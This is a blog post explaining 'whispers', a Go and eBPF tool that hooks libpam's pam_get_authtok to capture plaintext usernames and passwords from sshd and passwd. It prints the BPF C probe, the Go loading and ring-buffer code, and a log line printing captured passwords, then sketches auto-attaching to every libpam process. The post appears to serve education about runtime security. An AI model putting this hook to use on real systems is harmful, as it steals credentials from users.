+++
title = "Snooping on libpam (openssh auth, passwd) with Golang and eBPF"
date = "2024-02-18T11:40:02Z"
author = "Peter McConnell"
cover = "https://raw.githubusercontent.com/peter-mcconnell/petermcconnell.com/master/assets/whispers.png"
tags = ["linux", "ebpf", "golang", "hacking", "libpam"]
keywords = ["linux", "ebpf", "golang", "hacking", "libpam", "openssh", "passwd"]
description = ""
showFullContent = false
readingTime = true
hideComments = false
color = "" #color from the theme settings
ToC = true
+++

In the vast and complex landscape of software security, safeguarding sensitive information remains a paramount concern for developers and security professionals alike. Among the myriad of challenges, securely managing and protecting credentials during authentication processes stands out as a critical vulnerability point. Traditional security measures often fall short in providing real-time insights into how credentials are handled and potentially exposed within applications, especially those relying on widely used authentication frameworks like PAM (Pluggable Authentication Modules).

I work for a runtime security platform so this topic, BPF, Golang and Linux are some that I find the most interesting. Tangentally I was asked to give a talk at a Golang meetup, so figured I'd create a mini project to showcase some of this tech may be a good way to get others excited about these topics. Hence this repo and article.

The source code for this project can be seen here: https://github.com/peter-mcconnell/whispers.

Developing the eBPF Program for whispers
----------------------------------------

This section provides an in-depth look at the development of the eBPF program for whispers, a tool designed to monitor and capture credentials handled by libpam. By leveraging eBPF, whispers taps into kernel functions related to authentication processes, offering unprecedented insights into credential management and security vulnerabilities.

### Technical Background

eBPF (Extended Berkeley Packet Filter) is a powerful technology that allows for the dynamic tracing of kernel and user space applications without modifying their source code or requiring prior knowledge of their internal workings. eBPF programs are run by the Linux kernel and can safely access kernel data structures, making them ideal for monitoring, networking, and security applications.
Setting Up the Development Environment

Before diving into eBPF program development, ensure your development environment is properly set up with the following tools and libraries:

    LLVM & Clang: For compiling eBPF programs.
    Linux Kernel Headers: Required for eBPF program compilation to access kernel APIs.
    libbpf: A library for loading and interacting with eBPF programs and maps.
    Go toolchain: For the Go-based components of whispers.

### Developing the eBPF Program

The eBPF program for whispers is designed to attach to the pam_get_authtok function via a uretprobe, capturing credentials as they're processed.
Key Components

    uretprobe.c: Contains the eBPF code that defines the data structures and logic for capturing and processing credential information from pam\_get\_authtok.

#### BPF code

When trying to look up the structure of pam\_get\_authtok I encountered https://github.com/citronneur/pamspy which is where I lifted most of this code from, so credit to them:

You can see the code in full at https://github.com/peter-mcconnell/whispers/blob/main/bpf/uretprobe.c

```c
...

// we need the pam_handle struct so that we can read the data in our BPF program
typedef struct pam_handle
{
  char *authtok;
  unsigned caller_is;
  void *pam_conversation;
  char *oldauthtok;
  char *prompt;
  char *service_name;
  char *user;
  char *rhost;
  char *ruser;
  char *tty;
  char *xdisplay;
  char *authtok_type;
  void *data;
  void *env;
} pam_handle_t;

// we're using a ringbuffer datastructure to share data back to our userspace program
struct
{
  __uint(type, BPF_MAP_TYPE_RINGBUF);
  __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

...

SEC("uretprobe/pam_get_authtok")
int trace_pam_get_authtok(struct pt_regs *ctx)
{
  if (!PT_REGS_PARM1(ctx))
    return 0;

  pam_handle_t* phandle = (pam_handle_t*)PT_REGS_PARM1(ctx);

  u32 pid = bpf_get_current_pid_tgid() >> 32;

  u64 password_addr = 0;
  bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->authtok);

  u64 username_addr = 0;
  bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);

  event_t *e;
  e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
  if (e)
  {
    e->pid = pid;
    bpf_probe_read(&e->password, sizeof(e->password), (void *)password_addr);
    bpf_probe_read(&e->username, sizeof(e->username), (void *)username_addr);
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    bpf_ringbuf_submit(e, 0);
  }
  return 0;
};
```

To handle compiling this code, given we're going to be using Golang we'll define a `go generate` later which will point to a bash script which will handle compilation.

#### Golang code

This section delves into the Go component of whispers, which serves as the user-space counterpart to the eBPF program. It outlines how to leverage Go to load the eBPF program, attach probes, read from eBPF maps, and process the captured credential data for monitoring and analysis purposes.

Ensure your Go environment is set up with the necessary dependencies:

    Go (1.21 or newer): Ensure the Go toolchain is installed.

The Go codebase for whispers is structured as follows:

    cmd/: Contains the CLI interface for whispers.
    pkg/config: Defines configuration structures and parsing logic.
    pkg/whispers: Implements the core functionality for loading and interacting with the eBPF program.

Dependencies are defined in `go.mod` and can be pulled with `go mod tidy`.

This article will only touch on the most interesting parts of the code. The source can be read at https://github.com/peter-mcconnell/whispers/blob/main/pkg/whispers/whispers.go.

We're using cilium ebpf to handle loading our BPF program and interacting with the BPF maps. In the following, `bpfObjects` and `loadBpfObjects` are defined in the auto-generated file `bpf_x86_bpfel.go`:

```golang
func Listen(ctx context.Context, cfg *config.Config) error {
    objs := bpfObjects{}
    if err := loadBpfObjects(&objs, nil); err != nil {
        return err
    }
    defer objs.Close()

    ...
}
```

The above snippet demonstrates loading the eBPF program and ensuring it is correctly cleaned up upon termination.

whispers attaches uretprobes to target functions (e.g., pam\_get\_authtok) also using the cilium/ebpf library:

```golang
ex, err := link.OpenExecutable(cfg.BinPath)
if err != nil {
    return err
}
up, err := ex.Uretprobe(cfg.Symbol, objs.TracePamGetAuthtok, nil)
if err != nil {
    return err
}
defer up.Close()
...
```

The Go code uses a ring buffer to read events captured by the eBPF program:

```golang
rb, err := ringbuf.NewReader(objs.Rb)
if err != nil {
    log.Printf("failed to open ring buffer reader: %v", err)
}
defer rb.Close()

go func() {
    for {
        record, err := rb.Read()
        ...
        event := parseEventData(record.RawSample)
        ...
    }
}()
```

After reading events from the ring buffer, whispers processes and logs the captured credentials:

```golang
log.Printf("Event: PID: %d, Comm: %s, Username: %s, Password: %s",
    event.Pid,
    byteArrayToString(event.Comm[:]),
    byteArrayToString(event.Username[:]),
    byteArrayToString(event.Password[:]))
```

Seeing it in action
-------------------

Included with the repository is a Dockerfile that not only builds `whisper` but also contains an sshd server ready to go, so that you can play with it immediately. The following is a demonstration of that:

[![asciicast](https://asciinema.org/a/641250.png)](https://asciinema.org/a/641250)

Improvements
------------

This project was designed to be very simple - specifically I'm aiming to give an overview of it during a tech talk. As such, it isn't intended to be feature-complete. Namely this project results in a binary whereby you provide the `-binPath=/path/to/libpam`, however we can automate this attachment with more eBPF.

This project has used uprobes to trace arguments for a given user-space application. However we can automate the auto-attachment of these probes using kprobes. With kprobes we could filter `execve` and `fork` for `comm`s that we deem to be interesting (e.g. `sshd`, `passwd`) and when we get a match, we could run `ldd` against the `/proc/<pid>/exe` to see if we can see `libpam` and attach that way. There are some complexities to consider here such as the namespace for a given process may be different (e.g. for containers). We'd likely also want to look at existing processes and attach probes to those also. However, these are all trivial problems to solve. The result being that you could run a single `whispers` with no targets, that would automatically attach our uprobes whenever a suitable process was started.
